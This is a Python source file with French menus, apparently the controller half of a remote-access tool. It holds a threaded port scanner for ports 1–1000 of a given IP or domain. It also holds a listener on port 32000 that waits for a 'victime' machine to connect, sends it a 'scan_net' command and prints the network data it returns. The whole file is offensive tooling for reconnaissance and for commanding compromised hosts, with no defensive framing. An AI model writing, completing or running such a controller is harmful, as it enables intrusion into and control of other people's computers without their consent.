import subprocess
import socket
import threading
import concurrent.futures
import platform

MAX_DATA_SIZE = 1024

def scan_network():
    print()
    print("""
    1) Scannez un réseaux
    2) Scannez le réseaux de la victime""")
    a = input("Votre choix : ")
    if a == "1":
        scan_reseaux()
    elif a == "2":
        scan_victime()
    else:
        print("ERREUR: vous devez entrez un nombre entre 1 et 2")

def socket_receive_all_data(socket_p, data_len):
        current_data_len = 0
        total_data = None
        # print("socket_receive_all_data len:", data_len)
        while current_data_len < data_len:
            chunk_len = data_len - current_data_len
            if chunk_len > MAX_DATA_SIZE:
                chunk_len = MAX_DATA_SIZE
            data = socket_p.recv(chunk_len)
            # print("  len:", len(data))
            if not data:
                return None
            if not total_data:
                total_data = data
            else:
                total_data += data
            current_data_len += len(data)
            # print("  total len:", current_data_len, "/", data_len)
        return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:  # if command == ""
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    longeur_data = int(header_data.decode())

    data_recues = socket_receive_all_data(socket_p, longeur_data)
    return data_recues


def init_scanner(ip, port):
    print_lock = threading.Lock()
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    scanner.settimeout(1)
    try:
        scanner.connect((ip, port))
        scanner.close()
        with print_lock:
            print(f"[{port}]" + "Opened")
    except:
        pass

def scan_reseaux():
    print()
    ip = input("Entrez votre ip ou nom de domaine : ")
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1000):
            executor.submit(init_scanner, ip, port + 1)
    print("""
    1) Rescannez une ip
    2) Exit
    """)
    print()
    terminer_scan = input("Votre choix : ")
    if terminer_scan == "1":
        scan_network()
    else:
        pass


def scan_victime():
    HOST_IP = ""
    HOST_PORT = 32000

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST_IP, HOST_PORT))
    s.listen()
    print()

    print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
    connection_socket, client_address = s.accept()
    print(f"Connexion établie avec {client_address}")

    ip_net = socket_send_command_and_receive_all_data(connection_socket, "scan_net")
    print(ip_net.decode())
